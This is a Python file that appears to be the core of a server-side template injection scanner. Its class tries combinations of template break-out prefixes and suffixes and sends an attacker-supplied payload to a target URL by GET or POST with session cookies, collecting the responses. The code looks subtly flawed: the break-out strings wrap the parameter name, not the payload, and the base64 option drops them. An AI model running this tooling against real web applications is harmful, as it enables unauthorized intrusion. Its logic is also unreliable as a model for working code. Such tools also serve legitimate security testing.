import base64
import requests as req
import urllib



class inject:
    def __init__(self,url,method,param,data,cookie,base64,pref,suff):
        self.prefixe = [
        "",
        "-->",
        "\n",
        "#}",
        "}}",
        "%}",
        "}",
        "]",
        "#end#if(1==1)",
        ")",
        "*#"
        ]
        self.suffixe = [
        "",
        "<#--",
        "{#",
        "\n",
        "[",
        "{{",
        "{{$",
        "{%",
        "(",
        "#*"
        ]
        self.pref = pref
        self.suff= suff
        if not self.suff: self.suffixe = ['']
        if not self.pref: self.prefixe = ['']
        self.url = url
        self.method = method
        self.parameter = param
        self.data = data
        self.cookie = cookie
        self.base64 = base64



    def inject(self,payload):
        response_array = []
        for p in self.prefixe:
            for s in self.suffixe:
                parameter = p+self.parameter+s
                if self.base64:
                    parameter = base64.b64encode(self.parameter.encode()).decode()
                if self.method == "get":
                    prm = urllib.parse.quote_plus(payload)
                    u = self.url + parameter + "=" +prm
                    r = req.get(u,cookies=self.cookie)
                    response_array.append([r,p,s])
                else:
                    u = self.url
                    self.data[parameter] = payload
                    r = req.post(u,data=self.data,cookies=self.cookie)
                    response_array.append([r,p,s])
        return response_array





